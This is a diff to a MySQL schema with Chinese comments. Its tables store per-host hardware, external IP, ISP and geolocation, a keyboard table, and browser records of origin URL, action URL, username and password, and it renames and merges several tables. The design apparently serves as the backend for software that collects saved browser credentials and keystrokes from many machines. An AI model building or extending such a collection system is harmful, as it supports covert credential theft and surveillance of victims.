@@ -13,14 +13,14 @@ CREATE TABLE IF NOT EXISTS `machine` (
   `memory` int(5) NOT NULL DEFAULT  0 COMMENT '内存MB',
   `disk` varchar (800) NOT NULL COMMENT '硬盘信息',
   `netcard` text NOT NULL COMMENT '网卡信息',
-  `oip` varchar (20) NOT NULL COMMENT '外网IP',
-  `isp` varchar (80) NOT NULL COMMENT '运营商',
-  `lon` double(10,6) NOT NULL COMMENT '经度',
-  `lat` double(10,6) NOT NULL COMMENT '纬度',
-  `down` int (5) NOT NULL COMMENT '下行',
-  `up` int (5) NOT NULL COMMENT '上行',
+  `oip` varchar (20)  NULL COMMENT '外网IP',
+  `isp` varchar (80)  NULL COMMENT '运营商',
+  `lon` double(10,6)  NULL COMMENT '经度',
+  `lat` double(10,6)  NULL COMMENT '纬度',
+  `down` int (5)  NULL COMMENT '下行',
+  `up` int (5)  NULL COMMENT '上行',
   `hostid` varchar (50) NOT NULL COMMENT '主机ID',
-  `soft_version` varchar(5) NOT NULL COMMENT '软件版本',
+  `softversion` varchar(5) NOT NULL COMMENT '软件版本',
   `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
   PRIMARY KEY (`id`),
   unique  index(`hostid`)
@@ -39,10 +39,12 @@ CREATE TABLE IF NOT EXISTS `keyboard` (
 DROP TABLE  IF  EXISTS  `browser`;
 CREATE TABLE IF NOT EXISTS `browser` (
   `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
-  `website` text NOT NULL COMMENT '浏览网址',
+  `origin_url` varchar(3000) NOT NULL COMMENT '浏览网址',
+  `action_url` varchar(3000)  NOT NULL COMMENT '浏览网址',
   `user`  varchar(30)  not null COMMENT '账号' ,
   `password` varchar(50)  not null COMMENT '密码' ,
   `hostid` varchar(50) not null COMMENT '主机ID' ,
+  `type` varchar(30) not null COMMENT  '浏览器类型',
   `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
   PRIMARY KEY (`id`),
   constraint user_browser_id foreign key(hostid) references machine(hostid)
@@ -81,26 +83,17 @@ CREATE TABLE IF NOT EXISTS `browser_download` (
   constraint browser_download_id foreign key(hostid) references machine(hostid)
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 
-DROP TABLE  IF  EXISTS  `browser_fail`;
-CREATE TABLE IF NOT EXISTS `browser_fail` (
+DROP TABLE  IF  EXISTS  `event`;
+CREATE TABLE IF NOT EXISTS `event` (
   `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `hostid` varchar(50) not null COMMENT '主机ID' ,
   `code` int(10) not null COMMENT '状态码' ,
+  `softversion` varchar(5) not null COMMENT '版本' ,
+  `type` varchar(25) not null COMMENT '程序类型' ,
   `reason` varchar(100) not null COMMENT '失败原因' ,
   `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
   PRIMARY KEY (`id`),
-  constraint browser_faild_id foreign key(hostid) references machine(hostid)
-) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
-
-DROP TABLE  IF  EXISTS  `softversion`;
-CREATE TABLE IF NOT EXISTS `softversion` (
-  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
-  `hostid` varchar(50) not null COMMENT '主机ID' ,
-  `version` varchar(5) not null COMMENT '版本' ,
-  `type` varchar(50) not null COMMENT '更新程序类型' ,
-  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
-  PRIMARY KEY (`id`),
-  constraint browser_faild_id foreign key(hostid) references machine(hostid)
+  constraint event_id foreign key(hostid) references machine(hostid)
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 
 DROP TABLE IF EXISTS `qrtz_job_details`;
